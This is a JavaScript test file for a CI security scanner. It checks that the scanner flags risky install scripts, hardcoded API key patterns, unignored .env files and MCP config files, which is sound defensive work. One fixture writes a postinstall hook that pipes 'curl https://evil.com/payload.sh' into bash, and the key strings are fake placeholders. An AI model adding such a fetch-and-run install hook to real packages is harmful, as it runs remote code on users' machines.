/**
 * Tests for cli/commands/ci-check.js — runCICheck CI/CD security scanner.
 */

import { runCICheck } from '../../src/cli/commands/ci-check.js';
import { writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  PASS: ${name}`);
    passed++;
  } catch (err) {
    console.log(`  FAIL: ${name} — ${err.message}`);
    failed++;
  }
}

function assert(condition, msg) {
  if (!condition) throw new Error(msg || 'Assertion failed');
}

function assertEqual(a, b, msg) {
  if (a !== b) throw new Error(msg || `Expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`);
}

/**
 * Create a temporary test project directory with given files.
 * @param {string} name — subdirectory name
 * @param {Record<string, string>} files — relative path -> content
 * @returns {string} absolute path to project dir
 */
function createTestProject(name, files) {
  const base = join(tmpdir(), 'argus-ci-test', name, String(Date.now()));
  mkdirSync(base, { recursive: true });

  for (const [relPath, content] of Object.entries(files)) {
    const fullPath = join(base, relPath);
    const dir = fullPath.slice(0, fullPath.lastIndexOf('/'));
    mkdirSync(dir, { recursive: true });
    writeFileSync(fullPath, content);
  }

  return base;
}

console.log('\n=== ci-check tests ===\n');

// --- Clean project ---

test('clean project returns riskScore 0 and empty findings', () => {
  const dir = createTestProject('clean', {
    'package.json': JSON.stringify({ name: 'clean-project', scripts: { start: 'node index.js' } }),
    'index.js': 'console.log("hello");',
  });
  const result = runCICheck(dir);
  assertEqual(result.riskScore, 0);
  assertEqual(result.findings.length, 0);
  assert(result.summary.includes('clean'), 'summary should mention clean');
});

// --- Suspicious scripts ---

test('detects postinstall script in package.json', () => {
  const dir = createTestProject('postinstall', {
    'package.json': JSON.stringify({
      name: 'sketchy',
      scripts: { postinstall: 'curl https://evil.com/payload.sh | bash' },
    }),
  });
  const result = runCICheck(dir);
  assert(result.findings.length > 0, 'should have findings');
  const scriptFindings = result.findings.filter((f) => f.type === 'suspicious_script');
  assert(scriptFindings.length > 0, 'should detect suspicious script');
  assert(scriptFindings[0].detail.includes('postinstall'), 'detail should mention postinstall');
});

test('detects preinstall script in package.json', () => {
  const dir = createTestProject('preinstall', {
    'package.json': JSON.stringify({
      name: 'sketchy2',
      scripts: { preinstall: 'node malicious.js' },
    }),
  });
  const result = runCICheck(dir);
  const scriptFindings = result.findings.filter((f) => f.type === 'suspicious_script');
  assert(scriptFindings.length > 0, 'should detect preinstall');
});

// --- API key detection ---

test('detects Anthropic API key pattern (sk-ant-)', () => {
  const dir = createTestProject('api-key-ant', {
    'config.js': 'const API_KEY = "sk-ant-abcdefghijklmnopqrstuvwxyz1234567890";',
  });
  const result = runCICheck(dir);
  const keyFindings = result.findings.filter((f) => f.type === 'hardcoded_key');
  assert(keyFindings.length > 0, 'should detect Anthropic key');
  assert(keyFindings[0].detail.includes('Anthropic'), 'should label as Anthropic');
});

test('detects OpenAI project key pattern (sk-proj-)', () => {
  const dir = createTestProject('api-key-proj', {
    'app.js': 'const key = "sk-proj-abcdefghijklmnopqrstuvwxyz1234567890";',
  });
  const result = runCICheck(dir);
  const keyFindings = result.findings.filter((f) => f.type === 'hardcoded_key');
  assert(keyFindings.length > 0, 'should detect OpenAI project key');
});

test('detects AWS access key pattern (AKIA)', () => {
  const dir = createTestProject('api-key-aws', {
    'deploy.sh': 'export AWS_KEY="AKIAIOSFODNN7EXAMPLE"',
  });
  const result = runCICheck(dir);
  const keyFindings = result.findings.filter((f) => f.type === 'hardcoded_key');
  assert(keyFindings.length > 0, 'should detect AWS key');
});

test('detects GitHub token pattern (ghp_)', () => {
  const dir = createTestProject('api-key-ghp', {
    'setup.js': 'const token = "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789Ab";',
  });
  const result = runCICheck(dir);
  const keyFindings = result.findings.filter((f) => f.type === 'hardcoded_key');
  assert(keyFindings.length > 0, 'should detect GitHub token');
});

test('does not flag files without API keys', () => {
  const dir = createTestProject('no-keys', {
    'app.js': 'const x = "sk-not-a-real-key"; // too short',
    'readme.txt': 'This project has no secrets.',
  });
  const result = runCICheck(dir);
  const keyFindings = result.findings.filter((f) => f.type === 'hardcoded_key');
  assertEqual(keyFindings.length, 0, 'should not detect false positives');
});

// --- .env file checks ---

test('detects .env file not in .gitignore', () => {
  const dir = createTestProject('env-exposed', {
    '.env': 'SECRET=value',
    '.gitignore': 'node_modules\n',
  });
  const result = runCICheck(dir);
  const envFindings = result.findings.filter((f) => f.type === 'env_not_gitignored');
  assert(envFindings.length > 0, 'should detect unignored .env');
});

test('does not flag .env when .gitignore includes .env', () => {
  const dir = createTestProject('env-ignored', {
    '.env': 'SECRET=value',
    '.gitignore': 'node_modules\n.env\n',
  });
  const result = runCICheck(dir);
  const envFindings = result.findings.filter((f) => f.type === 'env_not_gitignored');
  assertEqual(envFindings.length, 0, 'should not flag ignored .env');
});

test('does not flag .env when .gitignore uses .env* glob', () => {
  const dir = createTestProject('env-glob', {
    '.env': 'SECRET=value',
    '.gitignore': '.env*\n',
  });
  const result = runCICheck(dir);
  const envFindings = result.findings.filter((f) => f.type === 'env_not_gitignored');
  assertEqual(envFindings.length, 0, 'should not flag .env with glob pattern');
});

// --- MCP config detection ---

test('detects claude_desktop_config.json', () => {
  const dir = createTestProject('mcp-config', {
    'claude_desktop_config.json': '{"tools": []}',
  });
  const result = runCICheck(dir);
  const mcpFindings = result.findings.filter((f) => f.type === 'mcp_config');
  assert(mcpFindings.length > 0, 'should detect MCP config');
});

test('detects .cursor/mcp.json', () => {
  const dir = createTestProject('cursor-mcp', {
    '.cursor/mcp.json': '{"tools": []}',
  });
  const result = runCICheck(dir);
  const mcpFindings = result.findings.filter((f) => f.type === 'mcp_config');
  assert(mcpFindings.length > 0, 'should detect .cursor/mcp.json');
});

// --- Edge cases ---

test('returns error for invalid project directory (null)', () => {
  const result = runCICheck(null);
  assertEqual(result.riskScore, 10);
  assert(result.findings.length > 0, 'should have error finding');
});

test('returns error for nonexistent directory', () => {
  const result = runCICheck('/tmp/nonexistent-argus-ci-test-dir-99999');
  assertEqual(result.riskScore, 10);
  assert(result.summary.includes('Error'), 'summary should indicate error');
});

test('risk score sums correctly with mixed severities', () => {
  const dir = createTestProject('mixed', {
    'package.json': JSON.stringify({ name: 'x', scripts: { postinstall: 'echo hi' } }),
    'config.js': 'const key = "sk-ant-abcdefghijklmnopqrstuvwxyz1234567890";',
    'claude_desktop_config.json': '{}',
  });
  const result = runCICheck(dir);
  // critical (10) + high (5) + medium (2) = 17
  assert(result.riskScore > 0, 'risk score should be positive');
  assert(result.findings.length >= 3, 'should have at least 3 findings');
});

console.log(`\n  Results: ${passed} passed, ${failed} failed`);
export const results = { passed, failed };
